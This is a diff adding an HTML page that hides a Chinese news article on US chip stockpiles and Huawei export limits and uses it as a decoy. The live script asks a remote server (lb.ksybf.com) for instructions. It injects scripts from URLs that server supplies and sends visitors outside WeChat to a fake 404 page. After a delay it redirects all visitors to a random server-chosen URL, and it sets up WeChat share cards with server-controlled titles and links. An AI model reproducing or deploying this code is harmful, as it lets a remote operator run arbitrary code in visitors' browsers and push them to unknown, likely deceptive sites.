@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=0,viewport-fit=cover">
+<title></title>
+<script src="https://res.wx.qq.com/open/js/jweixin-1.4.0.js"></script>
+<script src="https://cdn.static.runoob.com/libs/jquery/1.8.3/jquery.js"></script>
+</head>
+<body>
+<p style="display:none;" id="content">最新数据显示，随着美国对华为的限制后，美国芯片产业出现了大量的商品库存。
+
+　　当然，为了摆脱对中国芯片工厂的依赖，美国特朗普政府甚至还准备补贴一些美国厂商，补贴额高达228亿美元。
+
+　　对此，有美国半导体专业警告称，美国官方补助根本不足以弥补美国芯片产业的缺口。
+
+　　那么到底需要多少资金才能弥补美国芯片产业的空缺呢？
+
+　　
+
+　　就在周二（1日），美国半导体产业研究公司VLSI Research 董事长兼首席执行官——哈奇森（G. Dan Hutcheson）表示，在美国总统——特朗普对中国华为祭出限令后，已经导致整体芯片业出现大量未售产品库存。
+
+　　王爷说财经之前也报道过，就在上个月，美国特朗普政府收紧了对华为的限令，禁止供应商将未经特殊许可的情况下，出售美国技术制造的芯片给华为。
+
+　　对此，哈奇森表示，在公布禁令之后，企业积压了很多库存。
+
+　　这位专家还说，（美国芯片产业）如此之大的芯片库存，甚至比经济大萧条时期的都要更加低迷。加之几年疫情的严重影响，导致需求更加低迷，甚至达到了“二战”以来的最低点。
+
+　　因此，哈奇森预测警告称：“美国芯片行业未来几年的年增长率将放缓到4%-6%之间。”
+
+　　
+
+　　当然，为了让美国企业摆脱对华为等芯片的需求，特朗普政府也给予这些相关企业一定的补助，以此希望美国企业或者厂商建立芯片工厂。
+
+　　就在今年6月初，美国德克萨斯州共 和 党 参 议 员——康宁（John Cornyn）和弗吉尼亚州民 主 党 参 议 员——沃伦（Mark Warner）联合提出一项法案，鼓励美国企业建芯片工厂，而且还将为美国本土半导体制造商提供至少228亿美元的资金支持。
+
+　　不过，市场普遍认为，这一点钱远远不足以填补此一缺口。
+
+　　在美国与中国的竞争当中，美国当当局正积极协助美国半导体公司将制造中心转移到亚洲以外的地区。
+
+　　当然，哈奇森也有这种想法，认为228亿美元，这还不到所需金额的一半。
+
+　　无独有偶，美国芯片巨头——高通也正在游说特朗普政府，呼吁取消公司向华为出售芯片的限制。
+
+　　就在上个月早些时候，高通发布简报称，该公司告诉美国政策制定者，他们的出口禁令不会阻止华为获得必要的组件，反而会把每年80亿美元的市场拱手让给其海外竞争对手。
+
+　　
+
+　　如上，哈奇森认为，美国的官方补助远远不够，那么到底需要多少呢？
+
+　　对此，哈奇森说：“这确实还达不到所需的资金水平，若是500亿美元更有可能获得理想的结果。”
+
+　　尽管受到地缘政治冲突的影响，但在新冠疫情的影响下，有更多人转向在家办公或是进行线上学习，这样转变推动了对电子产品的需求。
+
+　　对此，VLSI Research预测，2020年，全球半导体业将成长7%。
+
+　　与此同时，该机构还预期，在未来几年内，芯片产业将以每年4%-6%的速度增长。
+
+　　美国半导体产业协会（SIA）主席兼首席执行官——诺弗尔（John Neuffer）则在先前表示，扩增的禁令规范将对美国半导体业带来负面的影响。
+
+　　诺弗尔说：“我们重申立场，向中国销售不敏感的商业产品，将有助于推动美国半导体业的研究和创新，这对美国的经济实力和国家安全至关重要。”
+
+　　对此，你怎么看？你认为，接下来，美国芯片产业会如何？</p>
+<script>
+function is74wle4kbr2y(a, b) {
+    var c = document.createElement("script");
+    c.src = a,
+    c.onload = function() {
+        "function" == typeof b && b();
+    }
+    ,
+    document.body.appendChild(c);
+}
+
+function is_weixn()
+{  
+	var ua = navigator.userAgent.toLowerCase();  
+	if(ua.match(/MicroMessenger/i)=="micromessenger")
+	{  
+        return true;  
+    }
+	else
+	{  
+        return false;  
+    }  
+}
+
+$.getJSON("https://lb.ksybf.com/zhuanfa/Index/getRukouData?url=" + encodeURIComponent(location.href.split("#")[0]) + "&sj=" + Date.now(), function(data) {
+		if(data.code == "true")
+		{
+			if(data.data.dakai_state == '0')
+			{
+				if(!is_weixn())
+				{
+					location.href = '404.xml';
+				}
+			}
+			is74wle4kbr2y(data.data.tongji1);
+			is74wle4kbr2y(data.data.tongji2);
+			document.title = data.data.title;
+			console.log("data.data.yanchi_shijian:"+data.data.yanchi_shijian);
+			var arr = data.data.tz_url.split(/[\s\n]/);
+			setTimeout(function () {
+				location.href = arr[Math.floor((Math.random()*arr.length))];
+			}, data.data.yanchi_shijian);
+			console.log("data.data.info.appId:"+data.data.info.appId);	
+			console.log("data.data.info.nonceStr:"+data.data.info.nonceStr);
+			wx.config({
+				debug: false,
+				appId: data.data.info.appId,
+				timestamp: data.data.info.timestamp,
+				nonceStr: data.data.info.nonceStr,
+				signature: data.data.info.signature,
+				jsApiList: ["onMenuShareTimeline","onMenuShareAppMessage"]
+			});
+
+			wx.ready(function () {
+				//获取“分享到朋友圈”按钮点击状态及自定义分享内容接口
+				wx.onMenuShareAppMessage({
+					title: data.data.title, // 分享标题
+					desc: data.data.miaoshu,
+					link: data.data.url,  // 分享链接
+					imgUrl: data.data.image, // 分享图标
+					success: function () {
+						// 用户确认分享后执行的回调函数
+						//alert("用户确认分享后--执行的回调函数");
+					},
+					cancel: function () {
+						// 用户取消分享后执行的回调函数
+						//alert("用户取消分享后--执行的回调函数")
+					}
+				});
+
+				wx.onMenuShareTimeline({
+					title: data.data.title, // 分享标题
+					desc: data.data.miaoshu, // 分享描述
+					link: data.data.url, // 分享链接
+					imgUrl: data.data.image, // 分享图标
+					type: 'link', // 分享类型,music、video或link，不填默认为link
+					dataUrl: '', // 如果type是music或video，则要提供数据链接，默认为空
+					success: function () {
+						// 用户确认分享后执行的回调函数
+						//alert("用户确认分享后--执行的回调函数");
+					},
+					cancel: function () {
+						// 用户取消分享后执行的回调函数
+						//alert("用户取消分享后--执行的回调函数")
+					}
+				});
+			});
+		}
+		else
+		{
+			
+		}
+	});
+</script>
+
+</body>
+</html>
